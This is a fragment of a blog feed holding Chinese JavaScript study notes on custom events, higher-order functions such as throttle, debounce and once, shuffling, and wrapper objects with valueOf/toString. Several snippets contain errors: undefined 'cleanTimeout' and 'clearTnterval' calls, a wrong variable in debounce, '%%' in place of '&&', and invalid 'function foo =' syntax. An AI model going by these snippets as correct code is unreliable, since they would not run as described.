class="language-css">    <span class="selector-id">#modeCheckBox</span><span class="selector-pseudo">:checked</span> + <span class="selector-class">.content</span>&#123;</span></span><br><span class="line"><span class="language-css">        <span class="attribute">background-color</span>:black;</span></span><br><span class="line"><span class="language-css">    &#125;</span></span><br><span class="line"><span class="language-css">    </span></span><br><span class="line"><span class="language-css"></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><ol start="2"><li><p>组件 — 自定义事件 — 解耦</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 自定义事件</span></span><br><span class="line"><span class="keyword">const</span> detail = &#123;<span class="attr">index</span>: idx&#125;;</span><br><span class="line"><span class="keyword">const</span> event = <span class="keyword">new</span> <span class="title class_">CustomEvent</span>(<span class="string">&#x27;slide&#x27;</span>,&#123;<span class="attr">bubbles</span>:<span class="literal">true</span>, detail&#125;) </span><br><span class="line"><span class="variable language_">this</span>.<span class="property">contailer</span>.<span class="title function_">dispatchEvent</span>(event)</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> dom = <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;#app&#x27;</span>);</span><br><span class="line"><span class="comment">// 绑定事件， 传递过来的值可以通过ev.detail 来获取</span></span><br><span class="line">dom.<span class="title function_">addEventListener</span>(<span class="string">&#x27;log-in&#x27;</span>,<span class="function">(<span class="params">ev</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> &#123; detail &#125; = ev;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(detail);  <span class="comment">// hello</span></span><br><span class="line">&#125;)</span><br><span class="line"><span class="comment">// 派发事件，需要传入两个参数，一个是事件类型，另外一个是一个对象，detail就是传递过去的值</span></span><br><span class="line">dom.<span class="title function_">dispatchEvent</span>(<span class="keyword">new</span> <span class="title class_">CustomEvent</span>(<span class="string">&#x27;log-in&#x27;</span>,&#123;</span><br><span class="line">    <span class="attr">detail</span>:<span class="string">&#x27;hello&#x27;</span></span><br><span class="line">&#125;))</span><br></pre></td></tr></table></figure><p>web页面抽出来一个个包含模板 html、功能 js 和 样式 css</p><p>设计原则：封装性、正确性、扩展性、复用性</p><p>实现步骤：结构设计、展现效果、行为设计（API 功能    Event 控制流 — 解耦）</p><p>三次重构：</p><ul><li>使用插件：<a href="http://code.h5jun.com/weru/edit?js,output">code.h5jun.com/weru/edit?js,output</a></li><li>模板化：<a href="http://code.h5jun.com/weru/3/edit?js,output">code.h5jun.com/weru/3/edit?js,output</a></li><li>组件框架：<a href="http://code.h5jun.com/vata/4/edit?js,output">code.h5jun.com/vata/4/edit?js,output</a></li></ul></li><li><p>过程抽象</p><p>为了让“只执行一次”的<strong>需求覆盖不同的事件处理，可以将这个需求剥离出来，这个过程就是过程抽象</strong></p><p>once：<a href="http://code.h5jun.com/zoqop/edit?js,output">code.h5jun.com/zoqop/edit?js,output</a></p><p><strong>高阶函数：函数作为函数的 参数 或者 返回值，常用于函数装饰器</strong></p><blockquote><p>接收一个函数作为参数，返回另一个参数，eg：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 等价装饰 0级高阶函数 等价范式</span></span><br><span class="line"><span class="comment">// 调用次函数装饰器 相当于 直接调用 fn  </span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">HOF0</span>(<span class="params">fn</span>)&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">function</span>(<span class="params">...args</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> fn.<span class="title function_">apply</span>(<span class="variable language_">this</span>,args);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></blockquote><blockquote><p>常用的高阶函数：</p><ul><li><p>once</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">limit</span>(<span class="params">fn,times = <span class="number">1</span></span>)&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">function</span>(<span class="params">...args</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> times-- &gt; <span class="number">0</span> ? fn.<span class="title function_">apply</span>(<span class="variable language_">this</span>,args) : <span class="literal">null</span>; </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">function</span> foo = <span class="title function_">limit</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;foo&#x27;</span>)</span><br><span class="line">&#125;,<span class="number">2</span>)</span><br></pre></td></tr></table></figure></li><li><p>throttle：<a href="http://code.h5jun.com/gale/1/edit?js,output">code.h5jun.com/gale/1/edit?js,output</a></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">throttle</span>(<span class="params">fn,dur</span>)&#123;</span><br><span class="line">    <span class="keyword">var</span> timer;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">function</span>(<span class="params">...args</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span>(timer == <span class="literal">null</span>)&#123;</span><br><span class="line">            fn.<span class="title function_">apply</span>(<span class="variable language_">this</span>,<span class="variable language_">arguments</span>);</span><br><span class="line">            timer = <span class="built_in">setTimeout</span>(<span class="function">()=&gt;</span>&#123;</span><br><span class="line">                <span class="title function_">cleanTimeout</span>(timer);</span><br><span class="line">            &#125;,dur)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>debounce：<a href="http://code.h5jun.com/wik/edit?js,output">code.h5jun.com/wik/edit?js,output</a></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">debounce</span>(<span class="params">fn, dur</span>)&#123;</span><br><span class="line">    dur = dur || <span class="number">100</span>;</span><br><span class="line">    <span class="keyword">var</span> timer;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="built_in">clearTimeout</span>(time);</span><br><span class="line">        timer = <span class="built_in">setTimeout</span>(<span class="function">()=&gt;</span>&#123;</span><br><span class="line">            fn.<span class="title function_">apply</span>(<span class="variable language_">this</span>,<span class="variable language_">arguments</span>);</span><br><span class="line">        &#125;,dur);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>consumer ：<a href="http://code.h5jun.com/roka/7/edit?js,output">code.h5jun.com/roka/7/edit?js,output</a>   res + i = res</p><p>​                       <a href="http://code.h5jun.com/bucu/3/edit?js,output">code.h5jun.com/bucu/3/edit?js,output</a>     hit + 123</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">consumer</span>(<span class="params">fn,time</span>)&#123;</span><br><span class="line">    <span class="keyword">let</span> tasks = [],timer;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">function</span>(<span class="params">...args</span>)&#123;</span><br><span class="line">        tasks.<span class="title function_">push</span>(fn.<span class="title function_">bind</span>(<span class="variable language_">this</span>,...args));</span><br><span class="line">        <span class="keyword">if</span>(timer == <span class="literal">null</span>)&#123;</span><br><span class="line">            timer = <span class="built_in">setInterval</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">                tasks.<span class="title function_">shift</span>().<span class="title function_">call</span>(<span class="variable language_">this</span>);</span><br><span class="line">                <span class="keyword">if</span>(tasks.<span class="property">length</span> &lt;= <span class="number">0</span>)&#123;</span><br><span class="line">                    <span class="title function_">clearTnterval</span>(timer);</span><br><span class="line">                    timer = <span class="literal">null</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;,time)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>lterative：<a href="http://code.h5jun.com/kapef/edit?js,output">code.h5jun.com/kapef/edit?js,output</a>  批量操作</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="title function_">inIterable</span> = obj =&gt; </span><br><span class="line">      obj != <span class="literal">null</span> %% <span class="keyword">typeof</span> obj[<span class="title class_">Symbol</span>.<span class="property">iterator</span>] === <span class="string">&#x27;function&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">iterative</span>(<span class="params">fn</span>)&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">function</span>(<span class="params">subject, ...rest</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_">inIterable</span>(subject))&#123;</span><br><span class="line">            <span class="keyword">const</span> ret = [];</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">let</span> obj <span class="keyword">of</span> subject)&#123;</span><br><span class="line">                ret.<span class="title function_">push</span>(fn.<span class="title function_">apply</span>(<span class="variable language_">this</span>,[obj, ...rest]));</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> ret;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> fn.<span class="title function_">apply</span>(<span class="variable language_">this</span>,[subject, ...rest]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul></blockquote><p>为什么使用高阶函数：减少系统的纯函数、便于测试</p><blockquote><p>pure纯函数：输入确定后输出就是确定的，便于做单例测试 add(x,y)</p><p>impure非纯函数：依赖外部环境，setColor次序，时间，次数不同结构不同</p><p>（操作dom都非）可以用纯函数 iterative 包 setColor 得到一个纯函数</p></blockquote></li><li><p>编程范式</p><p>命令式：关心执行过程</p><p>和</p><p>声明式：不关心</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 声明式 三态</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">toggle</span>(<span class="params">... actions</span>)&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">function</span>(<span class="params">...args</span>)&#123;</span><br><span class="line">        <span class="keyword">let</span> action = actions.<span class="title function_">shift</span>();</span><br><span class="line">        actions.<span class="title function_">push</span>(action);</span><br><span class="line">        <span class="keyword">return</span> action.<span class="title function_">apply</span>(<span class="variable language_">this</span>,args);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">swicher.<span class="property">onclick</span> = <span class="title function_">toggle</span>(</span><br><span class="line">    <span class="function"><span class="params">evt</span> =&gt;</span> evt.<span class="property">target</span>.<span class="property">className</span> = <span class="string">&#x27;off&#x27;</span>,</span><br><span class="line">    <span class="function"><span class="params">evt</span> =&gt;</span> evt.<span class="property">target</span>.<span class="property">className</span> = <span class="string">&#x27;on&#x27;</span></span><br><span class="line">)</span><br></pre></td></tr></table></figure></li><li><p>案例</p><ol><li><p>交通灯</p></li><li><p>洗牌</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">shuffle</span>(<span class="params">cards</span>)&#123;</span><br><span class="line">    <span class="keyword">const</span> c = [...cards];</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">let</span> i = c.<span class="property">length</span>; i &gt; <span class="number">0</span>; i--)&#123;</span><br><span class="line">        <span class="keyword">const</span> pindex = <span class="title class_">Math</span>.<span class="title function_">floor</span>(<span class="title class_">Math</span>.<span class="title function_">random</span>() * i);</span><br><span class="line">        [c[pindex],c[i-<span class="number">1</span>]] = [c[i-<span class="number">1</span>], c[pindex]];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> c;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 抽牌</span></span><br><span class="line"><span class="comment">// code.h5jun.com/zamuv/edit?js,console</span></span><br><span class="line"><span class="keyword">function</span> * <span class="title function_">draw</span>(<span class="params">cards</span>)&#123;</span><br><span class="line">    <span class="keyword">const</span> c = [...cards];</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">let</span> i = c.<span class="property">length</span>; i &gt; <span class="number">0</span>; i--)&#123;</span><br><span class="line">        <span class="keyword">const</span> pindex = <span class="title class_">Math</span>.<span class="title function_">floor</span>(<span class="title class_">Math</span>.<span class="title function_">random</span>() * i);</span><br><span class="line">        [c[pindex],c[i-<span class="number">1</span>]] = [c[i-<span class="number">1</span>], c[pindex]];</span><br><span class="line">        <span class="keyword">yield</span> c[i-<span class="number">1</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>是否是4的幂</p></li><li><p>分红包</p><blockquote><p>利用了抽牌的思路：<a href="http://code.h5jun.com/luba/edit?js,console">code.h5jun.com/luba/edit?js,console</a></p></blockquote></li></ol></li></ol>]]></content>
      
      
      <categories>
          
          <category> learningNotes </category>
          
      </categories>
      
      
        <tags>
            
            <tag> js </tag>
            
            <tag> 青训营 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>包装对象与toString、valueOf隐式调用</title>
      <link href="/furtherNotes/further/01%20toString%20valueof"/>
      <url>/furtherNotes/further/01%20toString%20valueof</url>
      
        <content type="html"><![CDATA[<blockquote><p>问辉哥for in hasOwnPrototype 的时候，他问我String 有没有 toString 方法，</p><p>然后提到了包装对象 和 toString 的隐式调用</p><p>包装对象 <a href="https://www.jianshu.com/p/32465288e738">https://www.jianshu.com/p/32465288e738</a></p><p>隐式转换 <a href="https://juejin.cn/post/6844903557968166926">https://juejin.cn/post/6844903557968166926</a></p><p>隐式调用 <a href="https://juejin.cn/post/6844903749090017294">https://juejin.cn/post/6844903749090017294</a></p></blockquote><h3 id="1.-包装对象">1. 包装对象<a title="#1.-包装对象" href="#1.-包装对象"></a></h3><h4 id="1.1-定义">1.1 定义<a title="#1.1-定义" href="#1.1-定义"></a></h4><p>对象是 JavaScript 语言中最主要的数据类型，三种原始类型的值：Number、Boolean、String 的值，在一定的条件下也会<strong>自动转为对象</strong>，即<strong>原始类型的 ” 包装对象 “</strong> wrapper</p><p>所谓的包装对象，指的是与数值、字符串、布尔值分别相应的 Number、String、Boolean 三个原生对象。这三个原生对象可以把原始类型的值包装成对象。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> v1 = <span class="keyword">new</span> <span class="title class_">Number</span>(<span class="number">123</span>);</span><br><span class="line"><span class="keyword">var</span> v2 = <span class="keyword">new</span> <span class="title class_">String</span>(<span class="string">&#x27;abc&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> v3 = <span class="keyword">new</span> <span class="title class_">Boolean</span>(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">typeof</span> v1 <span class="comment">// &quot;object&quot;</span></span><br><span class="line"><span class="keyword">typeof</span> v2 <span class="comment">// &quot;object&quot;</span></span><br><span class="line"><span class="keyword">typeof</span> v3 <span class="comment">// &quot;object&quot;</span></span><br><span class="line"></span><br><span class="line">v1 == <span class="number">123</span> <span class="comment">// true</span></span><br><span class="line">v2 == <span class="string">&#x27;abc&#x27;</span> <span class="comment">// true</span></span><br><span class="line">v3 == <span class="literal">true</span> <span class="comment">// true</span></span><br><span class="line"></span><br><span class="line">v1 === <span class="number">123</span> <span class="comment">// false</span></span><br><span class="line">v2 === <span class="string">&#x27;abc&#x27;</span> <span class="comment">// false</span></span><br><span class="line">v3 === <span class="literal">true</span> <span class="comment">// false</span></span><br></pre></td></tr></table></figure><h4 id="1.2-设计目的">1.2 设计目的<a title="#1.2-设计目的" href="#1.2-设计目的"></a></h4><p>包装对象的<strong>设计目的</strong>：</p><ol><li>使得”<strong>对象</strong>“这种类型<strong>可以覆盖 JavaScript 所有的值</strong>，整门语言有一个<strong>通用的数据模型</strong></li><li>使得<strong>原始类型</strong>的值有办法<strong>调用自己的方法</strong></li></ol><h4 id="1.3-普通函数-和-构造函数-使用">1.3 普通函数 和 构造函数 使用<a title="#1.3-普通函数-和-构造函数-使用" href="#1.3-普通函数-和-构造函数-使用"></a></h4><ul><li>作为普通函数调用（String(123) ）：将<strong>任意类型</strong>的值转为<strong>原始类型</strong>的值</li><li>作为构造函数使用（ new String(123) ）：可以将<strong>原始类型</strong>的值转为 <strong>对象</strong></li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">String</span>(<span class="number">123</span>)      <span class="comment">// &quot;123&quot;</span></span><br><span class="line"><span class="keyword">new</span> <span class="title class_">String</span>(<span class="number">123</span>)  <span class="comment">// String &#123;&quot;123&quot;&#125;</span></span><br></pre></td></tr></table></figure><h4 id="1.4-方法">1.4 方法<a title="#1.4-方法" href="#1.4-方法"></a></h4><h5 id="1.4.1-实例方法">1.4.1 实例方法<a title="#1.4.1-实例方法" href="#1.4.1-实例方法"></a></h5><p>三种包装对象都具有的、从 object 对象继承的方法：<code>valueOf()</code> 和 <code>toString()</code></p><h6 id="1.4.1.1-valueof()">1.4.1.1 valueOf()<a title="#1.4.1.1-valueof()" href="#1.4.1.1-valueof()"></a></h6><p>返回包装对象<strong>实例对应的原始类型</strong>的值</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">new</span> <span class="title class_">Number</span>(<span class="number">123</span>).<span class="title function_">valueOf</span>()  <span class="comment">// 123</span></span><br><span class="line"><span class="keyword">new</span> <span class="title class_">String</span>(<span class="number">123</span>).<span class="title function_">valueOf</span>()  <span class="comment">// &quot;123&quot;</span></span><br><span class="line"><span class="keyword">new</span> <span class="title class_">Boolean</span>(<span class="number">123</span>).<span class="title function_">valueOf</span>() <span class="comment">// true</span></span><br></pre></td></tr></table></figure><h6 id="1.4.1.2-tostring()">1.4.1.2 toString()<a title="#1.4.1.2-tostring()" href="#1.4.1.2-tostring()"></a></h6><p>返回<strong>对应的字符串形式</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">new</span> <span class="title class_">Number</span>(<span class="number">123</span>).<span class="title function_">toString</span>() <span class="comment">// &quot;123&quot;</span></span><br><span class="line"><span class="keyword">new</span> <span class="title class_">String</span>(<span class="number">123</span>).<span class="title function_">toString</span>() <span class="comment">// &quot;123&quot;</span></span><br><span class="line"><span class="keyword">new</span> <span class="title class_">Boolean</span>(<span class="number">123</span>).<span class="title function_">toString</span>() <span class="comment">// &quot;true&quot;</span></span><br></pre></td></tr></table></figure><h5 id="1.4.2-原始类型与实例对象的自动转换">1.4.2 原始类型与实例对象的自动转换<a title="#1.4.2-原始类型与实例对象的自动转换" href="#1.4.2-原始类型与实例对象的自动转换"></a></h5><p>某些场合，<strong>原始类型的值会自动当作包装对象调用</strong>，即调用包装对象的属性和方法，此时 JavaScript 引擎会<strong>自动将原始类型的值转为包装对象的实例，并在使用后立即销毁实例</strong>。</p><blockquote><p>eg：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> str = <span class="string">&quot;abc&quot;</span>;  <span class="comment">// === new String(str)</span></span><br><span class="line">str.<span class="property">length</span> <span class="comment">// 3</span></span><br><span class="line"></span><br><span class="line">str.<span class="property">x</span> = <span class="number">123</span></span><br><span class="line">str.<span class="property">x</span>  <span class="comment">// undefined</span></span><br></pre></td></tr></table></figure><p>如上述的 str 是一个字符串，本身不是对象，不能调用 length 属性。JavaScript 引擎<strong>自动将其转为包装对象</strong>，在这个对象上调用 length 属性。调用结束后，这个<strong>临时对象就会被销毁</strong>。<strong>这就是原始类型与实例对象的自动转换</strong>。</p><p>上述第二个例子，返回 undefined 的原因有：</p><ol><li>自动转换生成的包装对象是<strong>只读的</strong></li><li>调用结束后，包装对象的实例会销毁，意味着下次调用字符串属性时，调用的是一个<strong>新的对象</strong></li></ol><p>如果要为字符串添加属性，只有在其原型对象 String.prototype 上定义</p></blockquote><h5 id="1.4.3-自定义方法">1.4.3 自定义方法<a title="#1.4.3-自定义方法" href="#1.4.3-自定义方法"></a></h5><p>除了原生的实例方法，包装对象还可以自定义方法和属性，供原始类型的值直接调用</p><p>自定义的方法要加载 包装对象的 prototype 上</p><blockquote><p>eg：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Number</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">double</span> = <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="title function_">valueOf</span>() + <span class="variable language_">this</span>.<span class="title function_">valueOf</span>();</span><br><span class="line">&#125;</span><br><span class="line">(<span class="number">123</span>).<span class="title function_">double</span>()  <span class="comment">// 246  //要加上圆括号，否则后面的点运算符会被解释成小数</span></span><br><span class="line"><span class="number">123.0</span>.<span class="title function_">double</span>()</span><br><span class="line"><span class="number">123.</span>.<span class="title function_">double</span>()</span><br><span class="line"><span class="number">123</span> .<span class="title function_">double</span>()</span><br></pre></td></tr></table></figure></blockquote><h4 id="1.5-boolean-对象">1.5 Boolean 对象<a title="#1.5-boolean-对象" href="#1.5-boolean-对象"></a></h4><h5 id="1.5.1-概述">1.5.1 概述<a title="#1.5.1-概述" href="#1.5.1-概述"></a></h5><p>作为构造函数，其主要用于生成布尔值的包装对象实例</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> b = <span class="keyword">new</span> <span class="title class_">Boolean</span>(<span class="literal">false</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">typeof</span> b <span class="comment">// &quot;object&quot;</span></span><br><span class="line">b.<span class="title function_">valueOf</span>() <span class="comment">// false</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">new</span> <span class="title class_">Boolean</span>(<span class="literal">false</span>))&#123;  <span class="comment">// 因为 得到的是一个对象 所有是 true</span></span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="literal">true</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h5 id="1.5.2-类型转换作用">1.5.2 类型转换作用<a title="#1.5.2-类型转换作用" href="#1.5.2-类型转换作用"></a></h5><p>作为普通函数使用时，boolean 就单纯是一个工具方法<strong>Boolean() 的 语法糖为 !!</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Boolean</span>(<span class="literal">undefined</span>) <span class="comment">// false</span></span><br><span class="line"><span class="title class_">Boolean</span>(<span class="literal">null</span>) <span class="comment">// false</span></span><br><span class="line"><span class="title class_">Boolean</span>(<span class="number">0</span>) <span class="comment">// false</span></span><br><span class="line"><span class="title class_">Boolean</span>(<span class="string">&#x27;&#x27;</span>) <span class="comment">// false</span></span><br><span class="line"><span class="title class_">Boolean</span>(<span class="title class_">NaN</span>) <span class="comment">// false</span></span><br><span class="line"></span><br><span class="line"><span class="title class_">Boolean</span>(<span class="number">1</span>) <span class="comment">// true</span></span><br><span class="line"><span class="title class_">Boolean</span>(<span class="string">&#x27;false&#x27;</span>) <span class="comment">// true</span></span><br><span class="line"><span class="title class_">Boolean</span>([]) <span class="comment">// true</span></span><br><span class="line"><span class="title class_">Boolean</span>(&#123;&#125;) <span class="comment">// true</span></span><br><span class="line"><span class="title class_">Boolean</span>(<span class="keyword">function</span> (<span class="params"></span>) &#123;&#125;) <span class="comment">// true</span></span><br><span class="line"><span class="title class_">Boolean</span>(<span class="regexp">/foo/</span>) <span class="comment">// true</span></span><br></pre></td></tr></table></figure><h4 id="1.6-number-对象">1.6 Number 对象<a title="#1.6-number-对象" href="#1.6-number-对象"></a></h4><h5 id="1.6.1-概述">1.6.1 概述<a title="#1.6.1-概述" href="#1.6.1-概述"></a></h5><p>作为构造函数时，用于生成值为数值的对象</p><p>作为普通/工具 函数时，可以将任何类型的值转为数值</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> n = <span class="keyword">new</span> <span class="title class_">Number</span>(<span class="number">1</span>);</span><br><span class="line"><span class="title class_">Number</span>(<span class="literal">true</span>);  <span class="comment">// 1</span></span><br></pre></td></tr></table></figure><h5 id="1.6.2-静态属性">1.6.2 静态属性<a title="#1.6.2-静态属性" href="#1.6.2-静态属性"></a></h5><p>直接定义在 Number 对象的属性，而不是定义在实例上的，即要用 <a href="http://Number.xxx">Number.xxx</a> 访问</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Number</span>.<span class="property">POSITIVE_INFINITY</span>    <span class="comment">// Infinity  无穷大</span></span><br><span class="line"><span class="title class_">Number</span>.<span class="property">NEGATIVE_INFINITY</span>    <span class="comment">// -Infinity 无穷小</span></span><br><span class="line"><span class="title class_">Number</span>.<span class="property">NaN</span>                  <span class="comment">// NaN 非数值</span></span><br><span class="line"></span><br><span class="line"><span class="title class_">Number</span>.<span class="property">MAX_VALUE</span>            <span class="comment">// 1.7976931348623157e+308 </span></span><br><span class="line"><span class="title class_">Number</span>.<span class="property">MAX_VALUE</span> &lt; <span class="title class_">Infinity</span> <span class="comment">// true</span></span><br><span class="line"></span><br><span class="line"><span class="title class_">Number</span>.<span class="property">MIN_VALUE</span>            <span class="comment">// 5e-324   最小正整数</span></span><br><span class="line"><span class="title class_">Number</span>.<span class="property">MIN_VALUE</span> &gt; <span class="number">0</span>        